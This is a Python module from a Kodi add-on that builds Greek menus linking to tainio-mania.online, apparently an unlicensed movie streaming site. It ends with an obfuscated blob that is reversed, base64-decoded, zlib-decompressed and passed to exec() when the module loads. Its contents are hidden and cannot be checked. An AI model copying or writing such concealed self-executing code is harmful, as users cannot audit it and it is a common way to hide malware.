
import re, xbmc, xbmcgui, xbmcaddon, six, base64, requests, webbrowser
from six import ensure_text
from six.moves.urllib_parse import quote_plus, parse_qs, urlencode
from resources.lib.modules import client, control, views
from resources.lib.modules import dom_parser as dom
from resources.lib.modules.control import addDir

ADDON       = xbmcaddon.Addon()
ADDON_DATA  = ADDON.getAddonInfo('profile')
ADDON_PATH  = ADDON.getAddonInfo('path')
DESCRIPTION = ADDON.getAddonInfo('description')
FANART      = ADDON.getAddonInfo('fanart')
ICON        = ADDON.getAddonInfo('icon')
ID          = ADDON.getAddonInfo('id')
NAME        = ADDON.getAddonInfo('name')
VERSION     = ADDON.getAddonInfo('version')
Lang        = control.lang
Dialog      = xbmcgui.Dialog()
vers = VERSION
ART = ADDON_PATH + "/resources/icons/"
TAINIOMANIA = 'https://tainio-mania.online/'
Trailer = '[B][COLOR=lime]Τρέιλερ[/COLOR][/B]'
se = 'Αναζήτηση Ταινίας - Τήλ.Σειράς'
page = '[B][COLOR=lime]Επόμενη σελίδα [/COLOR][/B]'
no_name = '[COLOR lime] * [COLOR orange]Δεν υπάρχει διαθέσιμο Link [COLOR lime]*[/COLOR]'
lan = '[COLOR=gray]Γλώσσα:[/COLOR]'
sub_en = '[COLOR=gray] | Υπ/τλοι:[/COLOR]'
sub_ell = '[COLOR=gray] | Υπ/τλοι:[/COLOR]'
sub_no = ' |[COLOR=lime] Χωρίς Υπότιτλους[/COLOR]'
categ_no = "[COLOR orange]Στην περίπτωση που δεν εμφανίζονται οι κατηγορίες:[/COLOR]"
Dialog_no = "[COLOR white]Πατώντας Εντάξει θα ανοίξει ο browser της συσκευής μας το site [COLOR coral]ΤΑΙΝΙΟΜΑΝΙΑ[COLOR white].[CR]Τσεκάρουμε το τετραγωνάκι ( I'm not a robot ) και έπειτα πατάμε Αποστολή.[CR]Επιστρέφουμε πίσω και οι κατηγορίες επανεμφανίζονται ξανά.[/COLOR]"

def Tainiomania_menu(): #84
    addDir('[B][COLOR coral]2025[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2025-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]2024[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2024-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]2023[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2023-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Έτος[/COLOR][/B]', '', 86, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κατηγορίες[/COLOR][/B]', '', 87, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Top 250 Movies[/COLOR][/B]', 'https://tainio-mania.online/load/top_250_movies/', 89, ART + 'tainiomania.png', FANART, '')

def menu_genre(): #87
    addDir('[B][COLOR coral]Ελλ-ταινίες[/COLOR][/B]', TAINIOMANIA + 'load/ellhnik_tain_e/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κωμωδίες[/COLOR][/B]', TAINIOMANIA + 'load/komodia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Δράμα[/COLOR][/B]', TAINIOMANIA + 'load/drama/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Αισθηματικές[/COLOR][/B]', TAINIOMANIA + 'load/aisthhmatik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Οικογενειακές[/COLOR][/B]', TAINIOMANIA + 'load/oikogeneiak/', 89, ART + 'tainiomania.png', FANART, '')
#    addDir('[B][COLOR coral]Χριστουγιεννιάτικες[/COLOR][/B]', TAINIOMANIA + 'collections/2-hristoygenniatikes-tainies-online', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μεταγλωτισμένα Παιδικά[/COLOR][/B]', TAINIOMANIA + 'load/metaglwtismena-paidika-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κινούμενα Σχέδια[/COLOR][/B]', TAINIOMANIA + 'load/kino_mena_sch_dia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Animation[/COLOR][/B]', TAINIOMANIA + 'xfsearch/genre/Animation/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Δράση[/COLOR][/B]', TAINIOMANIA + 'load/dr_sh/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Έγκλημα[/COLOR][/B]', TAINIOMANIA + 'load/egkl_mato/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Περιπέτεια[/COLOR][/B]', TAINIOMANIA + 'load/perip_teia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Πολέμου[/COLOR][/B]', TAINIOMANIA + 'load/polemik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ιστορικές[/COLOR][/B]', TAINIOMANIA + 'load/istorik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Τρόμου[/COLOR][/B]', TAINIOMANIA + 'load/tr_moy/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μυστήριο[/COLOR][/B]', TAINIOMANIA + 'load/mysthr_oy/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Θρίλερ[/COLOR][/B]', TAINIOMANIA + 'load/thr_ler/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Φαντασίας[/COLOR][/B]', TAINIOMANIA + 'load/fantas_a/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ντοκιμαντέρ[/COLOR][/B]', TAINIOMANIA + 'load/ntokimant_r/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Βιογραφίες[/COLOR][/B]', TAINIOMANIA + 'load/biograf_e/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μιούζικαλ[/COLOR][/B]', TAINIOMANIA + 'load/mio_zikal/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Αθλητικά[/COLOR][/B]', TAINIOMANIA + 'load/athlhtik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Θέατρο[/COLOR][/B]', TAINIOMANIA + 'load/th_atro/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μουσική[/COLOR][/B]', TAINIOMANIA + 'load/moysik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Σειρές[/COLOR][/B]', TAINIOMANIA + 'load/seir/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ολοκληρωμένες Σειρές[/COLOR][/B]', TAINIOMANIA + 'load/oloklhrwmenes_seires/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Γουέστερν[/COLOR][/B]', TAINIOMANIA + 'load/goy_stern_western/', 89, ART + 'tainiomania.png', FANART, '')

def clear_Title(txt):
    import six
    if six.PY2:
        txt = txt.encode('utf-8', 'ignore')
    else:
        txt = six.ensure_text(txt, encoding='utf-8', errors='ignore')
    txt = re.sub(r'<.+?>', '', txt)
    txt = re.sub(r'var\s+cp.+?document.write\(\'\'\);\s*', '', txt)
    txt = txt.replace("&quot;", "\"").replace('()', '').replace("&#038;", "&").replace('&#8211;', ':').replace('\n',
                                                                                                               ' ')
    txt = txt.replace("&amp;", "&").replace('&#8217;', "'").replace('&#039;', ':').replace('&#;', '\'').replace('&#8230;', '...')
    txt = txt.replace("&#38;", "&").replace('&#8221;', '"').replace('&#8216;', '"').replace('&#160;', '')
    txt = txt.replace("&nbsp;", "").replace('&#8220;', '"').replace('&#8216;', '"').replace('\t', ' ')
    txt = txt.replace('οσ ', 'ος ').replace('οσ:', 'ος:').replace('ασ ', 'ας ').replace('εσ ', 'ες ').replace('ησ ', 'ης ').replace('εισ ', 'εις ').replace('Τησ ', 'Της ')
    return txt
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))

